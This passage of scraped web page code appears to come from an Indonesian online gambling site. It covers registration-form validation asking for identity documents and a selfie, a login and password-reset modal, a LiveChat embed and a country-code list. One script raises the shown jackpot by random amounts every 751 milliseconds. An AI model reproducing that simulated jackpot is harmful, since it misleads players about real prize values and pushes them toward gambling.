            pattern:"Nomor ponsel harus terdiri dari angka saja dan minimal 5 angka tanpa angka 0 di depan.",
            remote : "Nomor ponsel tidak tersedia"
        },
        social_media_username: {
                        pattern:"Social ID cannot contain spaces",
                        remote : "The social media username has already been taken for this platform."
        },
        terms: {
            required: "Diperlukan Konfirmasi Syarat & Ketentuan",
        },
        captcha: {
            required: "Captcha Diperlukan",
            remote : "Captcha tidak valid"
        },
        birthDate: {
                        required: "::lang.Birth date required",
                        dateISO: "::lang.Invalid date",
        },  
        occupation: {
                        required: "Pekerjaan",
                       
        }, 
        source_fund: {
                        required: "Sumber Pendapatan diperlukan",
                       
        },  
        user_identification: {
                        required: "Diperlukan IC / PASPOR",
                       
        }, 
        user_identification_selfie: {
                        required: "Selfie dengan IC / PASPORT diperlukan",
                       
        },
    },
    errorElement: "em",
    errorPlacement: function (error, element) {
        // Add the `help-block` class to the error element
        error.addClass("help-block");

        // Add `has-feedback` class to the parent div.form-group
        // in order to add icons to inputs
        //element.parents(".col-sm-6").addClass("has-feedback");
        element.addClass("has-feedback");
        if (element.prop("type") === "checkbox") {
            error.insertAfter(element.parent("label"));
        } else {
            error.insertAfter(element);
        }

            // Add the span element, if doesn't exists, and apply the icon classes to it.
            function addErrorEleIcon(element){
                        if (!$(element).next("i")[0]) {
                $("<i class='icon-cancel form-control-feedback absolute'></i>").insertAfter(element);
                        }
                    }
        let eleId= element.id ;

            if(eleId == 'email' && !$('#email').hasClass('pending')){
                            addErrorEleIcon(element);
                        }else if(eleId == 'mobile_no' && !$('#mobile_no').hasClass('pending')){
                            addErrorEleIcon(element);
                        }else if(eleId == 'acc_no' && !$('#acc_no').hasClass('pending')){
                            addErrorEleIcon(element);
                        }else if(eleId == 'social_media_username'){
                            // addErrorEleIcon(element);
                            console.log(element);
                        }else{
                            addErrorEleIcon(element);
                        }
    },

    success: function (label, element) {
        // Add the span element, if doesn't exists, and apply the icon classes to it.
        function addSuccessEleIcon(element){
                        if (!$(element).next("i")[0]) {
                            $("<i class='icon-checkmark  form-control-feedback absolute'></i>").insertAfter(element);
                        }
                      }
        let eleId= element.id ; 

            if(eleId == 'email' && !$('#email').hasClass('pending')){
                addSuccessEleIcon(element);
                        }else if(eleId == 'mobile_no' && !$('#mobile_no').hasClass('pending')){
                            addSuccessEleIcon(element);
                        }else if(eleId == 'acc_no' && !$('#acc_no').hasClass('pending')){
                            addSuccessEleIcon(element);
                        }else{
                            addSuccessEleIcon(element);
                        }
    },
    highlight: function (element, errorClass, validClass) {
        function chgEleShowError(element){
                        $(element).addClass("has-error").removeClass("has-success");
                        $(element).next("i").addClass("icon-cancel").removeClass("icon-checkmark");
                    }
        let eleId= element.id ;

        if(eleId == 'email' && !$('#email').hasClass('pending')){
            chgEleShowError(element);
                    }else if(eleId == 'mobile_no' && !$('#mobile_no').hasClass('pending')){
                        chgEleShowError(element);
                    }else if(eleId == 'acc_no' && !$('#acc_no').hasClass('pending')){
                        chgEleShowError(element);
        }else{
            chgEleShowError(element);
                    }
    },
    unhighlight: function (element, errorClass, validClass) {
        function chgEleShowSuccess(element){
                        $(element).addClass("has-success").removeClass("has-error");
                        $(element).next("i").addClass("icon-checkmark").removeClass("icon-cancel");
                    }
            
        let eleId= element.id ;

        if($(element).attr('id') == 'email' && !$('#email').hasClass('pending')){
                                             chgEleShowSuccess(element);
                    }else if(eleId == 'mobile_no' && !$('#mobile_no').hasClass('pending')){
                        chgEleShowSuccess(element);
                    }else if(eleId == 'acc_no' && !$('#acc_no').hasClass('pending')){
                        chgEleShowSuccess(element);
                    }else{
                        chgEleShowSuccess(element);
            }
    },
    submitHandler: function (form) {
        $('button[type=submit]').prop('disabled', true);

        var curr_stage=parseInt($("#stage_val").val());

        if(   formSteps ==  curr_stage){

                        form.submit();
                 }
        else {
            $('button[type=submit]').prop('disabled', false);
        }
    }
});

            $('#mobile_no').keyup(function () {
                if($('#mobile_no').hasClass('pending')){
                    $('#mobile_no-error').text("Memvalidasi nomor ponsel...");
                    $('#mobile-validate-loader').show();
                }
            });

            $('#email').keyup(function () {
                if($('#email').hasClass('pending')){
                    $('#email-error').text("Memvalidasi email...");
                    $('#email-validate-loader').show();
                }
            });

            $('#acc_no').keyup(function () {
                if($('#acc_no').hasClass('pending')){
                    $('#acc_no-error').text("Memvalidasi nomor rekening bank...");
                    $('#accno-validate-loader').show();
                }
            });

$("#registerForm1").submit(function(e) {
    // Tampilkan pesan loading sebelum halaman refresh ke PHP
    sweetAlert('Mohon Tunggu...', 'Sedang memproses pendaftaran Anda', 'info');
    return true; 
});

$('.next_btn').on('click', function() {
    // Tetap jalankan fungsi validasi visual untuk pindah step/halaman, 
    // tapi tidak menghentikan proses submit akhir.
    validatingForm(0, false);
});

function validatingForm(times, isSubmit){
                times++;
                if(times > 2){
                    sweetAlert("Formulir memiliki bidang yang tidak valid. Silahkan dicek kembali", 'warning' );
                }

                if(($('#mobile_no').hasClass('pending') || $('#email').hasClass('pending'))){
                    showLoadingImgFn();
                }

                setTimeout(function(){
                    if($("#registerForm1").valid()){
                        if(!$('#mobile_no').hasClass('pending') && !$('#email').hasClass('pending')){
                            removeLoadingImgFn();

                            if(!isSubmit){ //if not submit only switch form
                                switchForm(1);
                            }else{
                                return $("#registerForm1").submit();
                            }
                        }else{
                            validatingForm(times, isSubmit);
                        }
                    }
                    else if($('#mobile_no').hasClass('pending') || $('#email').hasClass('pending')){
                        validatingForm(times, isSubmit);
                    }
                    else{
                        removeLoadingImgFn();
                        sweetAlert("Formulir memiliki bidang yang tidak valid. Silahkan dicek kembali", 'warning' );
                    }
                }, 1000);
}


function switchForm(val){
    var curr_stage=$("#stage_val").val();
    var up_val = parseInt(curr_stage)+val; // val -1 = previous tab, 1 = next tab
                    $("#stage_val").val(up_val);
                    window.scrollTo(0,0);
                    switch(up_val) {
                        case 0:
                                    $('.register_form_one').css("display" , "block");
                                    $('.register_form_two,.register_form_three').css("display" , "none");
                                    $('#step_title').find('span').text($('#step_title').attr('data-title'));
                                break;
                        case 1:
                            $('.btn-refresh-captcha').trigger('click');
                            $('.register_form_one,.register_form_three').css("display" , "none");
                            $('.register_form_two,.prev_btn').css("display" , "block");
                            $('#step_title').find('span').text($('#step_title').attr('data-title') + ' - ' + stepTwo_lang + ' 2 ');
                        break;
                        case 2:
                            $('.btn-refresh-captcha').trigger('click');
                            $('.register_form_one,.register_form_two').css("display" , "none");
                            $('.register_form_three,.prev_btn').css("display" , "block");
                            $('#step_title').find('span').text( stepLast_lang);
                        break;

                    }
}

$('.prev_btn').on('click', function() {
    switchForm(-1);
});

$(document).on('keyup',  function( event ) {
    event.preventDefault();
    if(event.which == 13 ){
            var el = $(this).find('#registerForm1 .next_btn:visible')
            if(!el){

                el = $(this).find('#registerForm1  button[type="submit"]:visible');
            }
            el.click();
    }
});


/*min and max length changing based on bank id*/
            var   default_minlength,  default_maxlength, selectedBank;
            default_minlength = $("#acc_no").attr('minlength');
            default_maxlength = $("#acc_no").attr('maxlength');
           $('#bankOpts--register').on('change', function() {
                selectedBank = $(this).find("option:selected").attr('data-bcode');
                var checkBankLimit = window.bankAccLength(selectedBank, default_minlength, default_maxlength);
            console.log(checkBankLimit.min_len);
                $("#acc_no").attr('minlength', checkBankLimit.min_len);
                $("#acc_no").attr('maxlength', checkBankLimit.max_len);
           });
        /*min and max length changing based on bank id*/
});
if(window.location.href.indexOf("ref") > -1) {
    var url = new URL(location);
    url.searchParams.delete('ref');
    history.pushState(null, document.title, url);
}
</script>
          <!-- <app-spinner *ngIf="requestState.inProgress" ></app-spinner> -->
          </div>
        </div>

      </div>

</div>
 
<script>
    $(document).ready(function () {
        ajax_jackpot();
        setInterval(function () {
            prize += getRandomIntInclusive(2451, 3470)
            prize = parseFloat(prize);
            $('#jackpot_amount').html( '<span>' + window.currencyCode + '</span> '+ commaSeparateNumber(prize,true));
        }, 751);
    });

    // FUNGSI SAKTI UNTUK MEMBUKA CHAT (DIPERKUAT)
    function openLiveChat() {
        if (window.LiveChatWidget) {
            window.LiveChatWidget.call("maximize");
        } else {
            // Jika diklik sebelum loading selesai, coba lagi dalam 1 detik
            setTimeout(openLiveChat, 1000);
        }
    }
</script>

<div class="mobilesite-footer">  
    <div class="container">
        <style media="screen">
            /* Sembunyikan tombol biru asli agar tidak menutupi menu */
            #chat-widget-container {
                opacity: 0 !important;
                visibility: hidden !important;
                pointer-events: none !important;
                transition: opacity 0.3s ease;
            }
            /* Munculkan kembali hanya saat chat sedang terbuka */
            #chat-widget-container.lc-opened, 
            #chat-widget-container[viewid="maximized"],
            .livechat-widget-is-maximized #chat-widget-container {
                opacity: 1 !important;
                visibility: visible !important;
                pointer-events: auto !important;
                z-index: 99999999 !important;
            }
        </style>

        <script>
            window.__lc = window.__lc || {};
            window.__lc.license = 19524780;
            window.__lc.integration_name = "manual_channels";
            window.__lc.product_name = "livechat";

            ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))

            // Tambahan: Pastikan saat widget di-minimize, dia balik sembunyi lagi
            window.LiveChatWidget.on('ready', function() {
                window.LiveChatWidget.on('visibility_changed', function(data) {
                    if (data.visibility === 'minimized') {
                        // Jika admin atau user tutup chat, sembunyikan lagi tombol birunya
                        document.getElementById('chat-widget-container').style.opacity = "0";
                    }
                });
            });
        </script>
    </div>
</div>
    </div>
</div>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
            <div class="flex-row text-center">
                <div class="footericon-single">
                    <a href="https://www.Goblin88.site/"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                
                <div class="footericon-single">
                    <a href="https://www.Goblin88.site/promotion.php"><i class="icon-gift"></i> <div>PROMOSI</div></a>
                </div>

                <div class="footericon-single" style="position: relative">
                    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu">
                        <i class="icon-chat1"></i>
                        <div>LIVE CHAT</div>
                    </a>
                    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu" style="display: none;">
                        <!-- Perbaikan: Langsung arahkan ke variabel PHP $linkLiveChat dan buka tab baru -->
                        <li>
                            <a href="https://direct.lc.chat/19926541/" target="_blank">
                                <i class="icon-chat1"></i>
                            </a>
                        </li>
                        <li>
                            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank"><i class="icon-whatsapp"></i></a>
                        </li>
                        <li>
                            <a href="https://telegram.me/BAB" target="_blank"><i class="icon-telegram"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
                    <style type="text/css">


    </style>
<div class="modal-header text-center">
      <button class="btn btn-link pull-left" id="btn-close--login-modal"> X </button>
      <div style="width:100%;">
        <h4 class="text-center modal-title">Login</h4>
      </div>
    </div>
    <div class="modal-body">
      
       
       
      <!--app_sub_skin != \Constants::onix  -->
      <form name="loginForm" id="loginForm" class="form-horizontal needs-validation" action="index.php" method="POST" [ngclass]="{'was-validated':isSubmit,'':!isSubmit }" novalidate="novalidate">
       <input type="hidden" name="_token" value="8xe1UaFS4z4Wok9HUllb8i4qMYsdSgmjxJov7pBY">        
        <div class="form-group ">
          <label for="UserName" class="fs-lg" i18n="">Nama pengguna</label>
          <div class="icon-input">
            <input type="text" class="form-control input-l" maxlength="50" name="user_name" autocomplete="off" required="required" id="UserName" aria-describedby="emailHelp" placeholder="">
            <i class="icon-user left"></i>

          </div>
        </div>
       
        

        <div class="form-group ">
          <label for="pwd--login" class="fs-lg" i18n="">Kata sandi</label>
          <div class="icon-input">
            <input type="password" class="form-control  input-l" maxlength="20" id="pwd--login" name="password" required="required" autocomplete="current-password">
            <i class="icon-lock left"></i>
            <i class="icon-eye toggle-password" input_id="#pwd--login"></i>
          </div>
        </div> 
        <div class="form-group "> 
          <label> 
            <input type="checkbox" id="RememberMe" name="remember_me" value="1" checked="">
            <small class="text-left"> Ingat saya </small>
        </label> 
        </div> 
      
    
        
                
        <div class="form-group" style="height:1px;background: #fff;"></div>
        
        <div class="form-group row no-gutters">
          <p>Atau Lanjutkan Dengan</p>
          <div class="col-xs-12" style="display:flex;align-items:center;gap:8px;">
                  <button type="button" style="display:flex;align-items: center;font-size:24px;padding:8px;border-radius: 50%;box-shadow:0px 1px 1px #3c3d3e40, 0px 0px 1px #3f40414f;border:none;" onclick="window.iFirebase.googleSignIn()">
                    <svg xmlns="http://www.w3.or ng/2000/svg" width="1em" height="1em" viewBox="0 0 128 128">
                    <path fill="#fff" d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.33 74.33 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.16 36.16 0 0 1-13.93 5.5a41.29 41.29 0 0 1-15.1 0A37.16 37.16 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.31 38.31 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.28 34.28 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.22 61.22 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38z"></path>
                    <path fill="#e33629" d="M44.59 4.21a64 64 0 0 1 42.61.37a61.22 61.22 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.28 34.28 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21z"></path>
                    <path fill="#f8bd00" d="M3.26 51.5a62.93 62.93 0 0 1 5.5-15.9l20.73 16.09a38.31 38.31 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9z"></path>
                    <path fill="#587dbd" d="M65.27 52.15h59.52a74.33 74.33 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68z"></path>
                    <path fill="#319f43" d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.16 37.16 0 0 0 14.08 6.08a41.29 41.29 0 0 0 15.1 0a36.16 36.16 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.73 63.73 0 0 1 8.75 92.4z"></path>
                  </svg>  
                  </button>  
                    
          </div>
        </div>
                    
        <div class="row  alert alert-danger message" _login-modal="" style="display: none;">
           </div>

        <div class="form-group text-center">
          <button type="submit" *ngif="!inProgress" class="btn btn-block btn-primary fs-lg btn-submit">Login</button>
       
            <button type="button" *ngif="!inProgress" class="btn btn-link" id="forgotPwd-btn--login-modal" i18n="">
              Lupa kata sandi? &nbsp;<i class="icon-redo"></i>
            </button>
          
        </div>

      </form>
      
      <form class="form-horizontal" id="resetPwdForm" name="resetPwdForm" action="/apply-resetpwd" method="post" novalidate="novalidate" style="display: none;">
        <input type="hidden" name="_token" value="8xe1UaFS4z4Wok9HUllb8i4qMYsdSgmjxJov7pBY">        
        
        <div class="form-group row">
            <div class="col-xs-6 radio_2 p-0 fpwContactMethod" style="padding: 0;" data-type="emailOpt">
                <input type="radio" name="comm_type" value="email" checked="">
                <label class="">
                    <span class="radio-title"> Alamat email </span>
                        <span class="marked">
                            <i class="icon-checkmark"></i>
                        </span>
                </label>
            </div>
                          <div class="col-xs-6 radio_2 p-0 fpwContactMethod" style="padding: 0;font-size: 12px;" data-type="mobileOpt">
                      <input type="radio" name="comm_type" value="mobile">
                      <label class="">
                          <span class="radio-title"> WA / Nomor telepon </span>
                              <span class="marked">
                                  <i class="icon-checkmark"></i>
                              </span>
                      </label>
              </div>
                    </div>
        <div class="form-group" id="emailInput">
          <label for="password">Alamat email</label>
          <div class="icon-input">
            <input type="email" class="form-control input-l" name="email" required="required" id="email" aria-describedby="emailHelp" placeholder="">
            <i class="icon-envelope left"></i>
          </div>
        </div>
                <div class="form-group row no-gutters" id="mobileInput" style="display: none;">
            <label class="">WA / Nomor telepon</label>
            
            <div class="input-group">            
                                <div class="input-group-btn pos-abs">
                <button type="button" class="btn btn-default dropdown-toggle input-l" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> 
                    <span id="txt-contact-country"> +62</span>
                    <span class="caret"></span>
                
                </button> 
                <input type="hidden" name="contact_country" value="62">
                <ul class="dropdown-menu" id="fpw-contact-country" style=" height: 200px; overflow-y: scroll; ">
                    <li><a class="js-opt" href="#" data-value="62" id="def-ctrycontact-opt">Indonesia (+62)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="62">Indonesia (+62)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="60">Malaysia (+60)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="65">Singapore (+65)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="63">Philippines (+63)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="855">Cambodia (+855)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="84">Viet Nam (+84)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="66">Thailand (+66)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="93">Afghanistan (+93)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="358">Aland Islands (+358)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="355">Albania (+355)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="213">Algeria (+213)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1684">American Samoa (+1684)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="376">Andorra (+376)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="244">Angola (+244)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1264">Anguilla (+1264)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="672">Antarctica (+672)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1268">Antigua and Barbuda (+1268)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="54">Argentina (+54)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="374">Armenia (+374)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="297">Aruba (+297)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="61">Australia (+61)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="43">Austria (+43)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="994">Azerbaijan (+994)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1242">Bahamas (+1242)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="973">Bahrain (+973)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="880">Bangladesh (+880)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1246">Barbados (+1246)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="375">Belarus (+375)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="32">Belgium (+32)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="501">Belize (+501)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="229">Benin (+229)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1441">Bermuda (+1441)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="975">Bhutan (+975)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="591">Bolivia (+591)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="599">Bonaire, Sint Eustatius and Saba (+599)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="387">Bosnia and Herzegovina (+387)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="267">Botswana (+267)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="55">Bouvet Island (+55)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="55">Brazil (+55)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="246">British Indian Ocean Territory (+246)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="673">Brunei Darussalam (+673)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="359">Bulgaria (+359)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="226">Burkina Faso (+226)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="257">Burundi (+257)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="237">Cameroon (+237)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1">Canada (+1)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="238">Cape Verde (+238)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1345">Cayman Islands (+1345)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="236">Central African Republic (+236)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="235">Chad (+235)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="56">Chile (+56)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="86">China (+86)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="61">Christmas Island (+61)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="672">Cocos (Keeling) Islands (+672)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="57">Colombia (+57)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="269">Comoros (+269)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="242">Congo (+242)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="242">Congo, Democratic Republic of the Congo (+242)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="682">Cook Islands (+682)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="506">Costa Rica (+506)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="225">Cote D'Ivoire (+225)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="385">Croatia (+385)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="53">Cuba (+53)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="599">Curacao (+599)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="357">Cyprus (+357)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="420">Czech Republic (+420)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="45">Denmark (+45)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="253">Djibouti (+253)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1767">Dominica (+1767)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1809">Dominican Republic (+1809)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="593">Ecuador (+593)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="20">Egypt (+20)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="503">El Salvador (+503)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="240">Equatorial Guinea (+240)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="291">Eritrea (+291)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="372">Estonia (+372)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="251">Ethiopia (+251)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="500">Falkland Islands (Malvinas) (+500)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="298">Faroe Islands (+298)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="679">Fiji (+679)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="358">Finland (+358)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="33">France (+33)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="594">French Guiana (+594)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="689">French Polynesia (+689)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="262">French Southern Territories (+262)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="241">Gabon (+241)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="220">Gambia (+220)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="995">Georgia (+995)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="49">Germany (+49)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="233">Ghana (+233)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="350">Gibraltar (+350)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="30">Greece (+30)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="299">Greenland (+299)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1473">Grenada (+1473)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="590">Guadeloupe (+590)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1671">Guam (+1671)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="502">Guatemala (+502)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="44">Guernsey (+44)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="224">Guinea (+224)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="245">Guinea-Bissau (+245)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="592">Guyana (+592)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="509">Haiti (+509)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="0">Heard Island and Mcdonald Islands (+0)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="39">Holy See (Vatican City State) (+39)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="504">Honduras (+504)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="852">Hong Kong (+852)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="36">Hungary (+36)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="354">Iceland (+354)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="91">India (+91)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="98">Iran, Islamic Republic of (+98)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="964">Iraq (+964)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="353">Ireland (+353)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="44">Isle of Man (+44)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="972">Israel (+972)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="39">Italy (+39)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1876">Jamaica (+1876)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="81">Japan (+81)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="44">Jersey (+44)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="962">Jordan (+962)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="7">Kazakhstan (+7)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="254">Kenya (+254)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="686">Kiribati (+686)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="850">Korea, Democratic People's Republic of (+850)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="82">Korea, Republic of (+82)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="381">Kosovo (+381)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="965">Kuwait (+965)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="996">Kyrgyzstan (+996)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="856">Lao People's Democratic Republic (+856)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="371">Latvia (+371)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="961">Lebanon (+961)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="266">Lesotho (+266)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="231">Liberia (+231)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="218">Libyan Arab Jamahiriya (+218)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="423">Liechtenstein (+423)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="370">Lithuania (+370)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="352">Luxembourg (+352)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="853">Macao (+853)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="389">Macedonia, the Former Yugoslav Republic of (+389)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="261">Madagascar (+261)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="265">Malawi (+265)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="960">Maldives (+960)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="223">Mali (+223)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="356">Malta (+356)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="692">Marshall Islands (+692)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="596">Martinique (+596)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="222">Mauritania (+222)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="230">Mauritius (+230)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="269">Mayotte (+269)</a></li>
